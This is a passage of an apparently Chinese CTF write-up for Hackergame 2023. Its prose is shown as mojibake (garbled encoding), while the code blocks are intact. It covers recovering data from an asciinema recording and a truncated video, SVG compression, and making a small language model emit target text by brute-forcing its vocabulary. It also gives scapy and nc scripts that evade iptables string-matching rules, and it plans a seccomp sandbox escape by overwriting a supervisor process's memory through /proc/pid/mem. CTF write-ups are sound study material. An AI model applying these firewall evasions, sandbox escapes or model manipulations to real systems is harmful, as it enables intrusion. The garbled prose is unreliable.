2ï¼‰ã€‚ä»¥æ­¤ç±»æ¨ï¼Œå¯ä»¥çŸ¥é“é™¤äº†ç¬¬ä¸€ä¸ªä»¥å¤–å…¶ä»–å‡ ä¸ªè¢«åˆ æ‰çš„å­—ç¬¦å¯èƒ½åœ¨çš„èŒƒå›´ã€‚

è¿™æ—¶æˆ‘å…ˆä¹±å¡«äº†å‡ ä¸ªå­—ç¬¦åˆ°è¾¹ç•Œï¼Œåˆ†åˆ«æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ç»“å°¾ï¼Œç¬¬äºŒä¸ª `l`
çš„åé¢ï¼Œç­‰ç­‰ã€‚å…ˆè§£å¯†ä¸€ä¸‹çœ‹çœ‹ï¼Œå‘ç°å¾ˆåƒ flagï¼Œæäº¤å°±é€šè¿‡äº†ã€‚

å®é™…ä¸Šâ€œå¯†æ–‡â€æœ‰ä¸€äº›åœ¨ä¸ç¡®å®šçš„åŒºé—´å†…ï¼Œæ¯”å¦‚ `flag{` åé¢ç´§æ¥ç€çš„ 1ï¼Œå¯èƒ½æ˜¯ n æˆ–è€… yã€‚

çœ‹äº†é¢˜è§£ï¼ŒåŸæ¥åˆ©ç”¨äº† flag å†…éƒ¨ä¸ä¼šå«æœ‰ `}` çš„è§„åˆ™ï¼Œç­”æ¡ˆç¡®å®æ˜¯å”¯ä¸€çš„ã€‚

## ğŸª é«˜é¢‘ç‡æ˜Ÿçƒ

æ‰“å¼€å½•åƒï¼Œæ˜¯ JSON æ ¼å¼ï¼Œä½†æ˜¯æœ‰ 2021 å¹´
[é€æ˜çš„æ–‡ä»¶](https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/official/%E9%80%8F%E6%98%8E%E7%9A%84%E6%96%87%E4%BB%B6/README.md)
å‡ºè¿‡çš„ [æ§åˆ¶åºåˆ—](https://vt100.net/emu/dec_ansi_parser)ã€‚

ä¸‹è½½å®˜æ–¹çš„ [æ’­æ”¾å™¨](https://github.com/asciinema/asciinema-player)ï¼Œç¼–è¾‘
HTMLï¼Œåœ¨æœ¬åœ° `python -m http.server` å¯åŠ¨æœåŠ¡ã€‚å¯ä»¥çœ‹åˆ°æ˜¯æ‰§è¡Œäº† less
å‘½ä»¤ï¼Œæˆ‘ä»¬éœ€è¦ä»ä¸­è·å–æ–‡ä»¶å†…å®¹ã€‚

å› ä¸ºå‰é¢å°åˆ°äº†ç”œå¤´ï¼Œæ­£å¥½æ’­æ”¾å™¨ä¹Ÿæä¾›äº† APIï¼Œæ‰“ç®—ç»§ç»­ç”¨ JavaScriptã€‚å…ˆæŒ‰ `.`
å¿«æ·é”®è·³åˆ°ç›®æ ‡ä½ç½®ï¼Œç„¶å `player.getCurrentTime()` è·å–æ—¶é—´ï¼Œå¯ä»¥çŸ¥é“å¼€å§‹æ—¶é—´æ˜¯
6.913002ï¼Œç»“æŸçš„åä¸€å¸§æ—¶é—´æ˜¯ 62.902046ã€‚æŠŠè¿™æ®µèŒƒå›´å†…çš„æ—¶é—´æˆ³æå–å‡ºæ¥ï¼Œå…ˆ `seek`
è¿‡å»ï¼Œç„¶åæŠŠæœ€ä¸‹é¢ä¸€è¡Œä»¥å¤–çš„å†…å®¹ä¿å­˜èµ·æ¥ã€‚æ‰§è¡ŒæŠ¥é”™ï¼Œå‘ç°æœ‰é‡å¤å†…å®¹ã€‚
åŠ äº†ä¸ªåˆ¤æ–­ï¼Œå½“å†…å®¹ä¸ä¸Šä¸€ä¸ªå±å¹•ç›¸åŒæ—¶è·³è¿‡ï¼Œè¿˜æ˜¯ä¸å¯¹ã€‚å¤±è´¥å°è¯•æ”¾åœ¨é™„ä»¶
[index.html](./14-ğŸª%20é«˜é¢‘ç‡æ˜Ÿçƒ/index.html)ã€‚

åˆçœ‹äº†çœ‹å½•åƒï¼ŒåŸæ¥æœ‰å¾ˆå¤šæ—¶é—´æˆ³åªè¾“å‡ºäº†ä¸€ç‚¹ç‚¹å†…å®¹ï¼Œç›´æ¥ seek
å¯èƒ½ä¼šçœ‹åˆ°ä¸­é—´çŠ¶æ€ã€‚ä½†æ˜¯ `.` å¿«æ·é”®å¯¹åº”çš„ step ä¸åœ¨ API é‡Œã€‚

çœ‹åˆ°é€šè¿‡äººæ•°å¾ˆå¤šï¼Œåº”è¯¥ä¸ä¼šå¾ˆéš¾ã€‚è¿˜æ˜¯ç”¨å› Python
äº†ã€‚å…ˆæ— è„‘æŠŠå¯¹åº”æ—¶é—´æ®µçš„è¾“å‡ºå…¨éƒ¨æ‹¼èµ·æ¥ï¼Œç„¶åæ›¿æ¢æ‰å…¶ä¸­å‡ºç°çš„æ§åˆ¶åºåˆ—å­—ç¬¦ä¸²ï¼ˆåªæœ‰ 2
ç§ï¼‰ï¼Œå¼€å¤´å’Œç»“å°¾ç‰¹æ®Šå¤„ç†ã€‚

```python
import json
import typing

junk: str = json.loads(r'"\r\u001b[K \u001b[KESC\b\b\bESC\u001b[K[\b[\u001b[K6\b6\u001b[K~\b~\r\u001b[K"')

with open('asciinema_restore.rec', 'r') as f:
    # Discard the first line
    f.readline()
    records: typing.List[typing.Tuple[float, str]] = []
    for line in f:
        timestamp, event_code, text = json.loads(line)
        assert(event_code == 'o')
        records.append((timestamp, text))
    start = 38
    assert(records[start][0] == 8.01591)
    end = 1882
    assert(records[end][0] == 62.902046)
    assert(records[38][1] == junk)
    assert(records[40][1] == junk)
    result = []
    first_screen = '\r\n'.join(records[37][1].split('\r\n')[:-1]) + '\r\n'
    result.append(first_screen)
    for i in range(start, end):
        result.append(records[i][1])
    blob = ''.join(result)
    blob = blob.replace(junk, '')
    blob = blob.replace(":\u001b[K", '')
    trailing = '\u001b[7m(END)\u001b[27m\u001b[K'
    assert(blob.endswith(trailing))
    blob = blob[:-len(trailing)]
    print(blob.count('\u001b'))
    print(len(blob))
    with open('out.js', 'wb') as f:
        f.write(blob.encode('utf-8'))
```

## ğŸª å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ

ç¬¬ä¸€é—®éšä¾¿è¯•çš„ï¼Œä¸€å‘é€šè¿‡ã€‚

```plaintext
Say "you are smart"

and "you are smart".

The little girl was so happy. She had learned something new and she was proud of herself. She had learned
ğŸ‘ğŸ‘ğŸ‘ flag1: flag{<Redacted>} ğŸ‘ğŸ‘ğŸ‘
```

ç¬¬äºŒé—®è·Ÿ AI èŠäº†å‡ åä¸ªå›åˆï¼Œå‘ç° AI å¥½åƒæ²¡æœ‰è®°å¿†åŠ›ï¼Œè€Œä¸”è¡¥å…¨çš„å†…å®¹ç»å¸¸ä¸åˆé€»è¾‘ã€‚
çœ‹é€šè¿‡äººæ•°å¾ˆå¤šï¼Œäºæ˜¯æ”¹æ”¹
[ä»£ç ](./15-ğŸª%20å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ/local.py) æšä¸¾è¯æ±‡è¡¨ï¼Œçœ‹å“ªä¸ªèƒ½è¾“å‡º
`accepted`ã€‚æ²¡æœ‰å¤„ç†é‚£ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œè¿˜å¥½ç»“æœä¹Ÿä¸å«ï¼Œç»“æœæ˜¯ `atively`ã€‚

```plaintext
atively

accepted the challenge.

The little girl was so excited. She had never been asked to do something like this before. She was determined to succeed
ğŸ‰ğŸ‰ğŸ‰ flag2: flag{<Redacted>} ğŸ‰ğŸ‰ğŸ‰
```

## ğŸª æµå¼æ˜Ÿçƒ

åŸä»£ç å°†è§†é¢‘æ‰€æœ‰å¸§çš„å†…å®¹ä¿å­˜åˆ°äº†æ–‡ä»¶ä¸­ï¼Œä½†åˆ æ‰äº†æœ«å°¾çš„ä¸€éƒ¨åˆ†ï¼Œé•¿åº¦æ˜¯ä»åŒºé—´ `[0, 100]`
é‡Œéšæœºé€‰çš„ã€‚

å…ˆæ‰¾ä¸€ä¸ªè§†é¢‘ä½œä¸ºè¾“å…¥ï¼Œæµ‹è¯•å¹¶å†™å‡ºåœ¨ä¸åˆ é™¤ç»“å°¾çš„æƒ…å†µä¸‹è¿˜åŸå†…å®¹çš„ä»£ç ã€‚å¯ä»¥ç›´æ¥ç¼–è¾‘åŸè„šæœ¬ï¼Œ
æŠŠå˜æ¢å‰çš„å€¼å­˜èµ·æ¥ï¼Œç”¨ `np.array_equal` çœ‹é€†å˜æ¢ä¹‹åæ˜¯å¦ç›¸ç­‰ã€‚OpenCV
è¯»å–å‡ºæ¥çš„é€šé“é¡ºåºæ˜¯ BGRï¼Œç”¨ Pillow çš„è¯éœ€è¦åè½¬ä¸€ä¸‹ã€‚

æ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯æˆ‘ä»¬åªçŸ¥é“æ–‡ä»¶æ€»å¤§å°ï¼Œä¸çŸ¥é“åŸè§†é¢‘çš„å¸§æ•°é‡ã€é«˜å’Œå®½ã€‚è¿™é‡Œç›´æ¥åœ¨æœ«å°¾å¡«å……
0ï¼Œæšä¸¾æ‰€æœ‰ç»„åˆï¼Œè¾“å‡ºç¬¬ä¸€å¸§ï¼Œç„¶åäººå·¥æ£€æŸ¥ã€‚æˆ‘é™åˆ¶äº†é«˜å’Œå®½éƒ½åœ¨ `[80, 1000]`
çš„åŒºé—´å†…ï¼Œæ¼äº†åŸè„šæœ¬é‡Œçš„ä¸èƒ½è¢« 10 æ•´é™¤ï¼Œä¸è¿‡åªæ˜¯ç»“æœä¼šå¤šç‚¹ã€‚

æ‰§è¡Œå®Œçœ‹åˆ°ä¸€å¼ å›¾ç‰‡é‡Œæœ‰å¤§å¤§çš„è“è‰² `BanG Dream!`
LOGOï¼Œå“å¾—æˆ‘ä»¥ä¸ºè¯»äº†æµ‹è¯•çš„æ•°æ®è€Œä¸æ˜¯é¢˜ç›®çš„æ–‡ä»¶ã€‚åˆ æ‰è¾“å‡ºï¼Œæ£€æŸ¥å‘½ä»¤å’Œä»£ç åå†æ¬¡æ‰§è¡Œï¼Œ
è¿˜æ˜¯ä¸€æ ·çš„ç»“æœã€‚æˆ‘æµ‹è¯•åˆšå¥½ç”¨çš„ MyGO çš„
[ã‚¤ã‚§ã‚¤ï¼ï¼ˆè€¶ï¼ï¼‰](https://www.bilibili.com/video/BV1T8411q759/)ï¼Œå› ä¸ºå®ƒå¤ŸçŸ­åªæœ‰ 2
ç§’ã€‚

ç¡®å®šå°ºå¯¸åï¼Œå†æ”¹æ”¹ä»£ç æŠŠæ‰€æœ‰å¸§ä¿å­˜ä¸ºå›¾ç‰‡å°±è¡Œã€‚

```python
import pathlib
import sys
import typing

import numpy as np
import PIL.Image

def prime_factor(x: int) -> typing.List[int]:
    assert(x >= 2)
    factors = []
    for f in range(2, x + 1):
        while x % f == 0:
            factors.append(f)
            x //= f
        if x == 1:
            break
        if f * f > x:
            factors.append(x)
            break
    return factors

Truncated_size = 135146688


def save_frame(frame, output_path) -> None:
    with PIL.Image.fromarray(np.array(frame[:,:,::-1])) as im:
        im.save(output_path)

def search(
    sizes: typing.List[int],
    factors: typing.List[int],
    next_index: int
) -> typing.Generator[typing.List[int], None, None]:
    for i in range(len(sizes)):
        sizes[i] *= factors[next_index]
        if next_index == len(factors) - 1:
            yield sizes
        else:
            yield from search(sizes, factors, next_index + 1)
        sizes[i] //= factors[next_index]


def get_first_frame(buffer: np.ndarray, size: int, factors: typing.List[int], output_dir: pathlib.Path) -> None:
    sizes = [1, 1, 1]
    for frame_count, frame_height, frame_width in search(sizes, factors, 0):
        if frame_height < 80 or 1000 < frame_height:
            continue
        if frame_width < 80 or 1000 < frame_width:
            continue
        save_frame(
            buffer.reshape((frame_count, frame_height, frame_width, 3))[0],
            output_dir / f'{frame_count}-{frame_height}-{frame_width}.png',
        )


def main() -> None:
    if len(sys.argv) != 3:
        print(f'Usage: {sys.argv[0]} truncated_dump output_dir', file=sys.stderr)
        exit(1)
    buffer = np.fromfile(sys.argv[1], dtype=np.uint8)
    d = pathlib.Path(sys.argv[2])

    # for origin_size in range(Truncated_size, Truncated_size + 100 + 1):
    #     if origin_size % 3 != 0:
    #         continue
    #     factors = prime_factor(origin_size)
    #     # Remove the factor of number of channels
    #     factors.remove(3)
    #     if factors[-1] >= 2000:
    #         continue
    #     origin_buffer = np.concatenate((
    #         buffer,
    #         np.zeros(origin_size - Truncated_size, dtype=np.uint8),
    #     ))
    #     get_first_frame(origin_buffer, origin_size, factors, d)

    frame_count, frame_height, frame_width = 139, 759, 427
    origin_size = frame_count * frame_height * frame_width * 3
    buffer = np.concatenate((
        buffer,
        np.zeros(origin_size - Truncated_size, dtype=np.uint8),
    ))
    buffer = buffer.reshape((frame_count, frame_height, frame_width, 3))
    for i, frame in enumerate(buffer):
        save_frame(frame, d / f'{i}.png')


if __name__ == "__main__":
    main()
```

## ğŸª ä½å¸¦å®½æ˜Ÿçƒ

flag1 è¦æ±‚ä¸è¶…è¿‡ 2KiBï¼Œéšä¾¿æ‰¾ä¸ª
[åœ¨çº¿æœåŠ¡](https://imageresizer.com/image-compressor) å°±å¯ä»¥ã€‚

flag2 å…ˆç¡®å®šæ¯ä¸ªè‰²å—çš„å°ºå¯¸å’Œé¢œè‰²ï¼Œç„¶åçœ‹
[æ–‡æ¡£](https://developer.mozilla.org/en-US/docs/Web/SVG)
æ‰‹å†™ SVGã€‚

```xml
<svg viewBox="0 0 1024 1024">
<rect width="1024" height="1024" fill="#D6CD9B"/>
<rect width="683" height="1024" fill="#0B69B9"/>
<rect width="321" height="1024" fill="#91406A"/>
</svg>
```

184 å­—èŠ‚ï¼Œç¦»ç›®æ ‡å¾ˆè¿œã€‚æ‰¾ä¸ª
[å‹ç¼©ç½‘ç«™](https://www.iloveimg.com/compress-image/compress-svg) è¯•è¯•ã€‚

```xml
<svg viewBox="0 0 1024 1024"><path fill="#D6CD9B" d="M0 0h1024v1024H0z"/><path fill="#0B69B9" d="M0 0h683v1024H0z"/><path fill="#91406A" d="M0 0h321v1024H0z"/></svg>
```

æœ‰ç‚¹æ•ˆæœï¼Œä½†ä¸å¤šã€‚è¿˜æœ‰ 165 å­—èŠ‚ã€‚çœ‹äº†ä¸‹ä¸€å—å°±å äº† 44 å­—èŠ‚ï¼Œçœ‹æ¥ SVG æ²¡æˆã€‚

ä¸‹è½½ vipsã€‚`vips -l foreign | grep "^        VipsForeignLoad"`
åˆ—äº†å¾ˆå¤šæ ¼å¼ï¼ŒæŠ½äº†å‡ ä¸ªçœ‹èµ·æ¥è¿˜ä¸å¦‚ SVGï¼Œçœ‹åˆ°é€šè¿‡äººæ•°è¿™ä¹ˆå°‘æ²¡æœ‰ç»§ç»­ã€‚

## Komm, sÃ¼sser Flagge

flag1 çš„è§„åˆ™æ˜¯åŒ¹é…å­—ç¬¦ä¸² `"POST"`ï¼Œåªéœ€è¦æŠŠ `POST` æ‹†å¼€å‘é€å°±å¯ä»¥ã€‚æ•°æ®è®© curl
ç”Ÿæˆã€‚

```shell
nc -l -p 3333 > r.txt
curl -v -X POST -d "114514:asdfgh==" http://127.0.0.1:3333
{ head -c 2 r.txt; sleep 1; tail -c +3 r.txt; } | nc 202.38.93.111 18080
```

flag2 ç”¨äº† u32 åŒ¹é…ã€‚æœç´¢å¯ä»¥æ‰¾åˆ°
<http://www.stearns.org/doc/iptables-u32.current.html>ï¼Œä¾‹å­éå¸¸å¥½ï¼Œ
è€Œä¸”è·Ÿé¢˜ç›®å¾ˆåƒã€‚ç®€å•æ¥è¯´æœ‰å‡ ç§æ“ä½œç¬¦ï¼Œç¬¬ä¸€ä¸ªæ•°æ˜¯ä» IP æŠ¥æ–‡æŒ‡å®šåç§»è¯» 4 ä¸ªå­—èŠ‚ï¼Œ`>>`
æ˜¯é€»è¾‘å³ç§»ï¼Œ`&` æ˜¯æŒ‰ä½ä¸ï¼Œ`@` æ˜¯è·³è¿‡å½“å‰ç»“æœçš„è¿™ä¹ˆå¤šä¸ªå­—èŠ‚ã€‚`0 >> 22 & 0x3C @`
è®¡ç®— IP å¤´é•¿åº¦å¹¶è·³è¿‡ IP å¤´ï¼Œ`12 >> 26 @` è®¡ç®— TCP å¤´é•¿åº¦å¹¶è·³è¿‡ TCP å¤´ï¼Œæœ€å
`0 >> 24 = 0x50` åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯å¦ä¸º `P`ã€‚

å…ˆè¯•è¯• [persistent connection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Connection_management_in_HTTP_1.x)ã€‚åœ¨å‰é¢å«ä¸€ä¸ª GET è¯·æ±‚ï¼Œè¿™æ · TCP
æ•°æ®çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å°±ä¸æ˜¯ P äº†ã€‚

```shell
nc -l -p 3333 > g.txt
curl -H 'Connection: Keep-Alive' -H http://127.0.0.1:3333
{ cat g.txt; cat r.txt; } | nc 202.38.93.111 18081
# HTTP/1.1 200 OK
# Content-Type: text/plain; charset=utf-8
# X-Content-Type-Options: nosniff
# Date: Sun, 29 Oct 2023 19:07:23 GMT
# Content-Length: 46
# Connection: close

# POST me your token and I'll give you the FLAG
```

ä¸è¡Œï¼ŒæœåŠ¡å™¨å“åº”å®Œç¬¬ä¸€ä¸ªè¯·æ±‚å°±æŠŠè¿æ¥å…³é—­äº†ã€‚

å¯¹æ¯”æ–‡ç« ç»™çš„ä¾‹å­åå¯ä»¥çŸ¥é“é¢˜ç›®çš„è§„åˆ™æ²¡æœ‰åˆ¤æ–­åè®®æ˜¯å¦ä¸º TCPï¼ˆ`6&0xFF=0x6`ï¼‰ï¼Œ
ä»¥åŠæ²¡æœ‰å¤„ç† IP fragmentationã€‚åªè¦æˆ‘ä»¬åˆ‡å¾—è¶³å¤Ÿç¢ï¼Œä¸è®© `P` è½åœ¨ç¬¬ä¸€ä¸ª IP æŠ¥æ–‡ï¼Œ
iptables ä¼šåœ¨åé¢çš„ fragments æŠŠå¥‡æ€ªçš„æ•°æ®å½“æˆ TCP å¤´æ¥è§£æã€‚

éšä¾¿æ‰¾äº†ä¸€ä»½ scapy æ‰‹åŠ¨ TCP æ¡æ‰‹çš„
[ä»£ç ](https://zhuanlan.zhihu.com/p/372206740)ï¼Œæµ‹è¯•äº†ä¸€ä¸‹èƒ½ç”¨ï¼Œè€Œä¸”æµ‹è¯•æ—¶ Windows
æ”¶åˆ° SYN+ACK ä¹Ÿæ²¡æœ‰è‡ªåŠ¨å›å¤ RSTã€‚

ä¿®æ”¹ä»£ç åŠ ä¸Š payload å’Œ IP fragmentï¼Œå‘é€ï¼Œåœ¨ Wireshark é‡Œçœ‹æ”¶åˆ°äº† TCP RSTã€‚æµ‹è¯•
GET è¯·æ±‚æ˜¯æ­£å¸¸çš„ï¼Œåº”è¯¥æ˜¯è·¯å¾„ä¸ŠæŸå°æœºå™¨å¸®æˆ‘é‡ç»„äº†ï¼Œåˆ°æœåŠ¡å™¨æ—¶å·²ç»æ˜¯æ²¡ fragment çš„äº†ã€‚
å°è¯•åœ¨ fragment é—´åŠ äº†å»¶è¿Ÿä¹Ÿä¸è¡Œã€‚

è¿æ¥é¢˜ç›®æä¾›çš„ VPN å†æ¥ä¸€æ¬¡ï¼Œè¿˜æ˜¯ä¸è¡Œã€‚çœ‹ Wireshark å‘ç°åœ¨ Ethernet è·Ÿ IP
192.168.x.y -> 192.168.23.1 ä¹‹é—´å¤šäº†ä¸€å±‚ IP 127.0.0.1 -> 127.0.0.1ã€‚æŠ˜è…¾äº†åŠå¤©ï¼Œ
å‘ç°åœ¨ Windows ä¸Šéœ€è¦ç”¨äºŒå±‚çš„ `scapy.sendrecv.srp` å¹¶æŒ‡å®š `iface` æ‰èƒ½æ­£å¸¸å‘é€ï¼Œ
æ²¡ç»†ç©¶åŸå› ã€‚

å‘æ˜¯å‘è¿‡å»äº†ï¼Œç¡®å®æ²¡è§¦å‘ RSTï¼Œä½†æ˜¯æœåŠ¡å™¨ä¹Ÿæ²¡å“åº”ï¼Œç­‰åˆ°ç¬¬ 10 ç§’å‘æ¥ FIN+ACKã€‚

æ¢ WSL2ï¼Œæ”¹ç”¨ tcpdump æŠ“åŒ…ã€‚Linux æ²¡æœ‰ Windows çš„é—®é¢˜ï¼Œå¯ä»¥æ­£å¸¸ç”¨ `send`
å‘é€ã€‚ä½†æ˜¯ Linux å†…æ ¸æ”¶åˆ° SYN+ACK æ—¶ä¼šå‘ RSTï¼ŒæŒ‰çŸ¥ä¹æ–‡ç« é‡Œçš„è¯´æ˜ç”¨
iptables DROP æ‰ã€‚

```shell
sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.23.1 -j DROP
```

è¿˜æ˜¯ä¸€æ ·çš„é™é»˜ 10s ç„¶å FIN+ACKã€‚ä¸€é¡¿æµ‹è¯•åå‘ç° GET ä¹Ÿä¸è¡Œï¼Œè€Œä¸”å½“æˆ‘åª fragment åˆ°
TCP æµç¬¬ä¸€ä¸ªå­—èŠ‚æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå‘ duplicate ack (ack=1)ï¼Œçœ‹æ¥åªè¦ fragment
äº†å°±æ”¶ä¸åˆ°ã€‚

çœ‹ [RFC 791](https://datatracker.ietf.org/doc/html/rfc791) è¦æ±‚ IP å±‚è‡³å°‘æ”¯æŒ
68 å­—èŠ‚ä¸ fragmentï¼Œéš¾é“æ˜¯ fragment è®¾ç½®å¤ªå°äº†ï¼Ÿé‚£æ ·è¦æŠŠ IP å¤´å¡«å……åˆ°ä¸Šé™ 60
å­—èŠ‚é™„è¿‘ã€‚çœ‹å‰ä¸¤é—®é€šè¿‡äººæ•°å¾ˆæ¥è¿‘ï¼Œä¸åƒæ˜¯è¿™ä¹ˆéš¾çš„é¢˜ç›®ã€‚

æ²®ä¸§ä¹‹ä¸‹å¹²è„†ä¸ fragment äº†ï¼Œç›´æ¥å‘é€ã€‚å±…ç„¶æˆåŠŸäº†ã€‚æµ‹è¯•å‘ç°ç”¨ç¬¬ä¸€é—®çš„åšæ³•å°±è¡Œï¼Œå‘ 1 åˆ°
3 ä¸ªå­—èŠ‚æ—¶ä¸ä¼šè§¦å‘é˜²ç«å¢™ï¼Œåº”è¯¥æ˜¯ `0 >> 24 = 0x50` ç”±äºå‰©ä¸‹çš„æ•°æ®ä¸å¤Ÿ 4 å­—èŠ‚æ²¡æœ‰æ‰§è¡Œã€‚

flag3 è¦æ±‚ 0 åˆ° 50 çš„èŒƒå›´å†…å«æœ‰ `"GET / HTTP"`ã€‚æˆ‘ä»¬å¯ä»¥æŠŠå®ƒæ”¾åˆ° IP options é‡Œï¼Œ
è¿˜æ˜¯è¯» RFC 791ï¼Œæˆ‘é€‰äº†çœ‹èµ·æ¥æ¯”è¾ƒéšæ„çš„ Record Routeã€‚scapy çš„æ–‡æ¡£ä¸å¤ªå¥½æ‡‚ï¼Œæˆ‘çœ‹äº†
<https://allievi.sssup.it/techblog/archives/631>
æ‰çŸ¥é“æ€ä¹ˆå†™ã€‚åŠ ä¸Š IP options åè¦è¿ VPNï¼Œå¦åˆ™è¿ SYN+ACK
éƒ½æ”¶ä¸åˆ°ã€‚è„šæœ¬æ²¡å¤„ç†å“åº”ï¼Œè¦ç”¨ Wireshark çœ‹ã€‚

```python
from scapy.all import *
import scapy.layers.inet
import scapy.sendrecv

ip = '192.168.23.1'
port = 18082
sport = 9028
iface = 'OpenVPN Data Channel Offload'

with open('s.txt', 'rb') as f:
    payload = f.read()

ip = scapy.layers.inet.IP(dst=ip, options=IPOption(b'\x07\x0f\x10GET / HTTP\x00\x00\x00'))

#äº§ç”ŸSYNåŒ…ï¼ˆFLAG = S ä¸ºSYNï¼‰
answered, unanswered = scapy.sendrecv.srp(
    ip / scapy.layers.inet.TCP(dport=port,sport=sport,flags='S',seq=17),
    verbose = False,
    iface=iface,
    timeout=1,
)
#ç¬¬ä¸€å±‚[0]ä½ç¬¬ä¸€ç»„æ•°æ®åŒ…
#ç¬¬äºŒå±‚[0]è¡¨ç¤ºå‘é€çš„åŒ…ï¼Œ[1]è¡¨ç¤ºæ”¶åˆ°çš„åŒ…
#ç¬¬ä¸‰å±‚[0]ä¸ºIPä¿¡æ¯ï¼Œ[1]ä¸ºTCPä¿¡æ¯ï¼Œ[2]ä¸ºTCPæ•°æ®
tcpfields_synack = answered[0][1][TCP].fields

sc_sn = tcpfields_synack['seq'] + 1
cs_sn = tcpfields_synack['ack']
print(sc_sn)
print(cs_sn)

#å‘é€ACK(flag = A),å®Œæˆä¸‰æ¬¡æ¡æ‰‹ï¼
scapy.sendrecv.srp(
    ip / scapy.layers.inet.TCP(dport=port,sport=sport,flags='A',seq=cs_sn,ack=sc_sn),
    verbose = False,
    iface=iface,
    timeout=0.01,
)

packet = ip / scapy.layers.inet.TCP(dport=port, sport=sport, flags='PA', seq=cs_sn, ack=sc_sn) / payload
scapy.sendrecv.srp(packet, verbose=False, iface=iface, timeout=0.01)
```

çœ‹äº†é¢˜è§£ï¼ŒåŸæ¥ flag2 æ˜¯å°‘äº† `& 0x3C` å¯¼è‡´ reserved bits é 0 æ—¶è®¡ç®— TCP header
é•¿åº¦å‡ºé”™ã€‚

## ä¸ºä»€ä¹ˆè¦æ‰“å¼€ /flag ğŸ˜¡

flag1 ç›´æ¥é™æ€é“¾æ¥ã€‚

```c
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

#define BUF_SIZE 100

int main() {
    int fd = open("/flag", O_RDONLY);
    if (fd == -1) {
        fprintf(stderr, "%s %d\n", "open", errno);
        return 1;
    }
    char buf[BUF_SIZE];
    int num_read = read(fd, buf, BUF_SIZE);
    if (num_read == -1) {
        fprintf(stderr, "%s %d\n", "read", errno);
        return 1;
    }
    int num_written = write(STDOUT_FILENO, buf, num_read);
    if (num_written == -1) {
        fprintf(stderr, "%s %d\n", "write", errno);
        return 1;
    }
    return 0;
}
```

```shell
gcc -static -Wall -Wextra -pedantic main.c
```

flag2 çœ‹ä»£ç æ£€æŸ¥äº† `open` çš„å‚æ•°ï¼Œå¦‚æœåŒ…å« `flag` å°±æ‰“å¼€å¹¶è¿”å› `/fakeflag` çš„ fdã€‚

ä»£ç é‡Œè¿˜æœ‰ä¸€ä¸ª `ALLOWLIST`ï¼Œå¯ä»¥ç”¨ `execve` æ‰§è¡Œå…¶ä»–å‘½ä»¤ï¼Œçœå¾—å†™ä»£ç ã€‚æ³¨æ„å› ä¸º
`fork` ç”¨ä¸äº†ï¼Œåªèƒ½ç›´æ¥è°ƒç”¨ç›®æ ‡ç¨‹åºï¼Œä¸èƒ½ç”¨ shellã€‚

é¦–å…ˆæƒ³åˆ°çš„æ˜¯è®© `open` çš„å‚æ•°ä¸åŒ…å« `flag`ï¼Œä½†æ˜¯ `link` å’Œ `symlink`
ç”¨ä¸äº†ã€‚é‚£ç›´æ¥è¯»åº•ä¸‹çš„å—è®¾å¤‡ï¼Ÿå°è¯•äº†å‡ ä¸ªå‘½ä»¤ï¼Œls å’Œ stat å¯ä»¥å·¥ä½œï¼Œ
ä½†æ˜¯å°±ç®—åœ¨æœ¬åœ°ä¸åŠ é™åˆ¶çš„ç¯å¢ƒä¹Ÿæ‰¾ä¸åˆ°å¯¹åº”çš„è®¾å¤‡ã€‚æœäº†ä¸€ä¸‹ï¼Œå¥½åƒ OverlayFS
æ²¡æœ‰å¯¹åº”çš„è®¾å¤‡ï¼Œå¦å¤–æ²¡æ³•ç›´æ¥ç”¨ inode number æ‰“å¼€æ–‡ä»¶ã€‚

å†çœ‹çœ‹ `ALLOWLIST` æœ‰ä»€ä¹ˆï¼Œå¯ä»¥ç”¨ `clone` æ¥å®ç°ç±»ä¼¼ `fork` çš„æ•ˆæœã€‚åœ¨ç½‘ä¸Šæ‰¾äº†ä¸€ä¸ª
[ä¾‹å­](https://eli.thegreenplace.net/2018/launching-linux-threads-and-processes-with-clone/)
ï¼Œå¯ä»¥è¿è¡Œï¼Œè€Œä¸”å­è¿›ç¨‹çš„è¾“å‡ºä¹Ÿèƒ½çœ‹åˆ°ï¼Œä½†æ˜¯å­è¿›ç¨‹ä¹Ÿç»§æ‰¿äº† seccompï¼Œçˆ¶è¿›ç¨‹é€€å‡ºåä¹Ÿä¸è§£é™¤ã€‚

ç»§ç»­çœ‹ `ALLOWLIST`ï¼Œæœ‰ `mmap`ã€`mprotect` å’Œ `lseek`ï¼Œæƒ³åˆ°åˆšç»“æŸçš„ GeekGame-3rd
[ç¦æ­¢æ‰§è¡Œï¼Œå¯åŠ¨](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob07-noexec)
flag2 è§£æ³•æ˜¯å†™ `/proc/[pid]/mem`ï¼Œè¯´ä¸å®šæˆ‘ä»¬å¯ä»¥æŠŠçˆ¶è¿›ç¨‹ supervisor é‡Œé¢çš„
`/fakeflag` æ”¹äº†ï¼Œè®©å®ƒå¸®æˆ‘ä»¬æ‰“å¼€ `/flag`ã€‚è™½ç„¶ä¸çŸ¥é“ rust
æ€ä¹ˆå­˜å‚¨å­—ç¬¦ä¸²ï¼Œä½†é•¿åº¦å·®åˆšå¥½æ˜¯å¶æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å†™æˆ `/././flag`ã€‚ä¹Ÿä¸çŸ¥é“å­—ç¬¦ä¸²åœ¨å“ªä¸ªæ®µï¼Œ
æ‰€ä»¥æŠŠ `.data` å‰é¢çš„å‡ ä¸ªéƒ½æœç´¢ä¸€éã€‚å†™çš„æ—¶å€™æ‰çŸ¥é“ `/proc/[pid]/mem`
[ä¸èƒ½](https://stackoverflow.com/questions/5216326/mmap-on-proc-pid-mem)
